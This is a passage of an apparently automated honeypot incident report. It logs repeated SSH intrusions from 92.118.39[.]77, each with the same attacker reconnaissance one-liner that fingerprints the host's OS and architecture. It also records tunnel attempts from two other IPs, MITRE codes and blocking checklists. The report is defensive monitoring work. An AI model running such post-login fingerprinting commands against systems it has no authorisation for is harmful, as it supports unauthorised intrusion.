| `2026-07-26 07:50:58` | `cowrie.command.input` |
| `2026-07-26 07:50:58` | `cowrie.command.input` |
| `2026-07-26 07:50:58` | `cowrie.command.input` |
| `2026-07-26 07:50:58` | `cowrie.command.input` |
| `2026-07-26 07:50:58` | `cowrie.command.input` |
| `2026-07-26 07:50:58` | `cowrie.command.success` |
| `2026-07-26 07:50:58` | `cowrie.command.input` |
| `2026-07-26 07:50:58` | `cowrie.command.input` |
| `2026-07-26 07:50:58` | `cowrie.command.input` |
| `2026-07-26 07:50:58` | `cowrie.command.input` |
| `2026-07-26 07:50:58` | `cowrie.log.closed` |
| `2026-07-26 07:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9adc2606eb52

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:52 |
| **Last Seen** | 2026-07-26 07:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:52:51` | `cowrie.session.connect` |
| `2026-07-26 07:52:51` | `cowrie.client.version` |
| `2026-07-26 07:52:51` | `cowrie.client.kex` |
| `2026-07-26 07:52:52` | `cowrie.login.success` |
| `2026-07-26 07:52:53` | `cowrie.session.params` |
| `2026-07-26 07:52:53` | `cowrie.command.input` |
| `2026-07-26 07:52:53` | `cowrie.command.input` |
| `2026-07-26 07:52:53` | `cowrie.command.input` |
| `2026-07-26 07:52:53` | `cowrie.command.input` |
| `2026-07-26 07:52:53` | `cowrie.command.input` |
| `2026-07-26 07:52:53` | `cowrie.command.success` |
| `2026-07-26 07:52:53` | `cowrie.command.input` |
| `2026-07-26 07:52:53` | `cowrie.command.input` |
| `2026-07-26 07:52:53` | `cowrie.command.input` |
| `2026-07-26 07:52:53` | `cowrie.command.input` |
| `2026-07-26 07:52:53` | `cowrie.log.closed` |
| `2026-07-26 07:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5baeb0be2d6d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:54 |
| **Last Seen** | 2026-07-26 07:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:54:41` | `cowrie.session.connect` |
| `2026-07-26 07:54:41` | `cowrie.client.version` |
| `2026-07-26 07:54:41` | `cowrie.client.kex` |
| `2026-07-26 07:54:43` | `cowrie.login.success` |
| `2026-07-26 07:54:45` | `cowrie.session.params` |
| `2026-07-26 07:54:45` | `cowrie.command.input` |
| `2026-07-26 07:54:45` | `cowrie.command.input` |
| `2026-07-26 07:54:45` | `cowrie.command.input` |
| `2026-07-26 07:54:45` | `cowrie.command.input` |
| `2026-07-26 07:54:45` | `cowrie.command.input` |
| `2026-07-26 07:54:45` | `cowrie.command.success` |
| `2026-07-26 07:54:45` | `cowrie.command.input` |
| `2026-07-26 07:54:45` | `cowrie.command.input` |
| `2026-07-26 07:54:45` | `cowrie.command.input` |
| `2026-07-26 07:54:45` | `cowrie.command.input` |
| `2026-07-26 07:54:45` | `cowrie.log.closed` |
| `2026-07-26 07:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fa6e571c80c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:56 |
| **Last Seen** | 2026-07-26 07:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:56:26` | `cowrie.session.connect` |
| `2026-07-26 07:56:27` | `cowrie.client.version` |
| `2026-07-26 07:56:27` | `cowrie.client.kex` |
| `2026-07-26 07:56:29` | `cowrie.login.success` |
| `2026-07-26 07:56:30` | `cowrie.session.params` |
| `2026-07-26 07:56:30` | `cowrie.command.input` |
| `2026-07-26 07:56:30` | `cowrie.command.input` |
| `2026-07-26 07:56:30` | `cowrie.command.input` |
| `2026-07-26 07:56:30` | `cowrie.command.input` |
| `2026-07-26 07:56:30` | `cowrie.command.input` |
| `2026-07-26 07:56:30` | `cowrie.command.success` |
| `2026-07-26 07:56:30` | `cowrie.command.input` |
| `2026-07-26 07:56:30` | `cowrie.command.input` |
| `2026-07-26 07:56:30` | `cowrie.command.input` |
| `2026-07-26 07:56:30` | `cowrie.command.input` |
| `2026-07-26 07:56:30` | `cowrie.log.closed` |
| `2026-07-26 07:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93f984dd3d98

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:58 |
| **Last Seen** | 2026-07-26 07:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:58:10` | `cowrie.session.connect` |
| `2026-07-26 07:58:10` | `cowrie.client.version` |
| `2026-07-26 07:58:10` | `cowrie.client.kex` |
| `2026-07-26 07:58:11` | `cowrie.login.success` |
| `2026-07-26 07:58:13` | `cowrie.session.params` |
| `2026-07-26 07:58:13` | `cowrie.command.input` |
| `2026-07-26 07:58:13` | `cowrie.command.input` |
| `2026-07-26 07:58:13` | `cowrie.command.input` |
| `2026-07-26 07:58:13` | `cowrie.command.input` |
| `2026-07-26 07:58:13` | `cowrie.command.input` |
| `2026-07-26 07:58:13` | `cowrie.command.success` |
| `2026-07-26 07:58:13` | `cowrie.command.input` |
| `2026-07-26 07:58:13` | `cowrie.command.input` |
| `2026-07-26 07:58:13` | `cowrie.command.input` |
| `2026-07-26 07:58:13` | `cowrie.command.input` |
| `2026-07-26 07:58:13` | `cowrie.log.closed` |
| `2026-07-26 07:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d93cc75150a1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:59 |
| **Last Seen** | 2026-07-26 08:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:59:56` | `cowrie.session.connect` |
| `2026-07-26 07:59:56` | `cowrie.client.version` |
| `2026-07-26 07:59:56` | `cowrie.client.kex` |
| `2026-07-26 07:59:58` | `cowrie.login.success` |
| `2026-07-26 08:00:00` | `cowrie.session.params` |
| `2026-07-26 08:00:00` | `cowrie.command.input` |
| `2026-07-26 08:00:00` | `cowrie.command.input` |
| `2026-07-26 08:00:00` | `cowrie.command.input` |
| `2026-07-26 08:00:00` | `cowrie.command.input` |
| `2026-07-26 08:00:00` | `cowrie.command.input` |
| `2026-07-26 08:00:00` | `cowrie.command.success` |
| `2026-07-26 08:00:00` | `cowrie.command.input` |
| `2026-07-26 08:00:00` | `cowrie.command.input` |
| `2026-07-26 08:00:00` | `cowrie.command.input` |
| `2026-07-26 08:00:00` | `cowrie.command.input` |
| `2026-07-26 08:00:00` | `cowrie.log.closed` |
| `2026-07-26 08:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d94cf358360

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:01 |
| **Last Seen** | 2026-07-26 08:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:01:35` | `cowrie.session.connect` |
| `2026-07-26 08:01:35` | `cowrie.client.version` |
| `2026-07-26 08:01:35` | `cowrie.client.kex` |
| `2026-07-26 08:01:37` | `cowrie.login.success` |
| `2026-07-26 08:01:39` | `cowrie.session.params` |
| `2026-07-26 08:01:39` | `cowrie.command.input` |
| `2026-07-26 08:01:39` | `cowrie.command.input` |
| `2026-07-26 08:01:39` | `cowrie.command.input` |
| `2026-07-26 08:01:39` | `cowrie.command.input` |
| `2026-07-26 08:01:39` | `cowrie.command.input` |
| `2026-07-26 08:01:39` | `cowrie.command.success` |
| `2026-07-26 08:01:39` | `cowrie.command.input` |
| `2026-07-26 08:01:39` | `cowrie.command.input` |
| `2026-07-26 08:01:39` | `cowrie.command.input` |
| `2026-07-26 08:01:39` | `cowrie.command.input` |
| `2026-07-26 08:01:39` | `cowrie.log.closed` |
| `2026-07-26 08:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13b24b4249f1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:03 |
| **Last Seen** | 2026-07-26 08:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:03:11` | `cowrie.session.connect` |
| `2026-07-26 08:03:11` | `cowrie.client.version` |
| `2026-07-26 08:03:11` | `cowrie.client.kex` |
| `2026-07-26 08:03:14` | `cowrie.login.success` |
| `2026-07-26 08:03:15` | `cowrie.session.params` |
| `2026-07-26 08:03:15` | `cowrie.command.input` |
| `2026-07-26 08:03:15` | `cowrie.command.input` |
| `2026-07-26 08:03:15` | `cowrie.command.input` |
| `2026-07-26 08:03:15` | `cowrie.command.input` |
| `2026-07-26 08:03:15` | `cowrie.command.input` |
| `2026-07-26 08:03:15` | `cowrie.command.success` |
| `2026-07-26 08:03:15` | `cowrie.command.input` |
| `2026-07-26 08:03:15` | `cowrie.command.input` |
| `2026-07-26 08:03:15` | `cowrie.command.input` |
| `2026-07-26 08:03:15` | `cowrie.command.input` |
| `2026-07-26 08:03:15` | `cowrie.log.closed` |
| `2026-07-26 08:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92c338fa30d8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:04 |
| **Last Seen** | 2026-07-26 08:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:04:47` | `cowrie.session.connect` |
| `2026-07-26 08:04:48` | `cowrie.client.version` |
| `2026-07-26 08:04:48` | `cowrie.client.kex` |
| `2026-07-26 08:04:50` | `cowrie.login.success` |
| `2026-07-26 08:04:52` | `cowrie.session.params` |
| `2026-07-26 08:04:52` | `cowrie.command.input` |
| `2026-07-26 08:04:52` | `cowrie.command.input` |
| `2026-07-26 08:04:52` | `cowrie.command.input` |
| `2026-07-26 08:04:52` | `cowrie.command.input` |
| `2026-07-26 08:04:52` | `cowrie.command.input` |
| `2026-07-26 08:04:52` | `cowrie.command.success` |
| `2026-07-26 08:04:52` | `cowrie.command.input` |
| `2026-07-26 08:04:52` | `cowrie.command.input` |
| `2026-07-26 08:04:52` | `cowrie.command.input` |
| `2026-07-26 08:04:52` | `cowrie.command.input` |
| `2026-07-26 08:04:52` | `cowrie.log.closed` |
| `2026-07-26 08:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0d6b75488f0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:06 |
| **Last Seen** | 2026-07-26 08:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:06:25` | `cowrie.session.connect` |
| `2026-07-26 08:06:25` | `cowrie.client.version` |
| `2026-07-26 08:06:25` | `cowrie.client.kex` |
| `2026-07-26 08:06:27` | `cowrie.login.success` |
| `2026-07-26 08:06:29` | `cowrie.session.params` |
| `2026-07-26 08:06:29` | `cowrie.command.input` |
| `2026-07-26 08:06:29` | `cowrie.command.input` |
| `2026-07-26 08:06:29` | `cowrie.command.input` |
| `2026-07-26 08:06:29` | `cowrie.command.input` |
| `2026-07-26 08:06:29` | `cowrie.command.input` |
| `2026-07-26 08:06:29` | `cowrie.command.success` |
| `2026-07-26 08:06:29` | `cowrie.command.input` |
| `2026-07-26 08:06:29` | `cowrie.command.input` |
| `2026-07-26 08:06:29` | `cowrie.command.input` |
| `2026-07-26 08:06:29` | `cowrie.command.input` |
| `2026-07-26 08:06:30` | `cowrie.log.closed` |
| `2026-07-26 08:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-318767d65c69

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:08 |
| **Last Seen** | 2026-07-26 08:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:08:01` | `cowrie.session.connect` |
| `2026-07-26 08:08:02` | `cowrie.client.version` |
| `2026-07-26 08:08:02` | `cowrie.client.kex` |
| `2026-07-26 08:08:04` | `cowrie.login.success` |
| `2026-07-26 08:08:06` | `cowrie.session.params` |
| `2026-07-26 08:08:06` | `cowrie.command.input` |
| `2026-07-26 08:08:06` | `cowrie.command.input` |
| `2026-07-26 08:08:06` | `cowrie.command.input` |
| `2026-07-26 08:08:06` | `cowrie.command.input` |
| `2026-07-26 08:08:06` | `cowrie.command.input` |
| `2026-07-26 08:08:06` | `cowrie.command.success` |
| `2026-07-26 08:08:06` | `cowrie.command.input` |
| `2026-07-26 08:08:06` | `cowrie.command.input` |
| `2026-07-26 08:08:06` | `cowrie.command.input` |
| `2026-07-26 08:08:06` | `cowrie.command.input` |
| `2026-07-26 08:08:06` | `cowrie.log.closed` |
| `2026-07-26 08:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b41f83f13d18

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 08:09 |
| **Last Seen** | 2026-07-26 08:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:09:37` | `cowrie.session.connect` |
| `2026-07-26 08:09:38` | `cowrie.client.version` |
| `2026-07-26 08:09:38` | `cowrie.client.kex` |
| `2026-07-26 08:09:40` | `cowrie.login.success` |
| `2026-07-26 08:09:42` | `cowrie.session.params` |
| `2026-07-26 08:09:42` | `cowrie.command.input` |
| `2026-07-26 08:09:42` | `cowrie.command.input` |
| `2026-07-26 08:09:42` | `cowrie.command.input` |
| `2026-07-26 08:09:42` | `cowrie.command.input` |
| `2026-07-26 08:09:42` | `cowrie.command.input` |
| `2026-07-26 08:09:42` | `cowrie.command.success` |
| `2026-07-26 08:09:42` | `cowrie.command.input` |
| `2026-07-26 08:09:42` | `cowrie.command.input` |
| `2026-07-26 08:09:42` | `cowrie.command.input` |
| `2026-07-26 08:09:42` | `cowrie.command.input` |
| `2026-07-26 08:09:43` | `cowrie.log.closed` |
| `2026-07-26 08:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc11e53ab401

| Field | Detail |
|---|---|
| **Source IP** | `132.251.255[.]162` |
| **First Seen** | 2026-07-26 08:10 |
| **Last Seen** | 2026-07-26 08:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:10:22` | `cowrie.session.connect` |
| `2026-07-26 08:10:23` | `cowrie.client.version` |
| `2026-07-26 08:10:23` | `cowrie.client.kex` |
| `2026-07-26 08:10:25` | `cowrie.login.success` |
| `2026-07-26 08:10:25` | `cowrie.direct-tcpip.request` |
| `2026-07-26 08:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `132.251.255[.]162` to AbuseIPDB if not already reported
- [ ] Block `132.251.255[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45ddfc142c02

| Field | Detail |
|---|---|
| **Source IP** | `27.39.130[.]144` |
| **First Seen** | 2026-07-26 08:10 |
| **Last Seen** | 2026-07-26 08:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 08:10:30` | `cowrie.session.connect` |
| `2026-07-26 08:10:31` | `cowrie.client.version` |
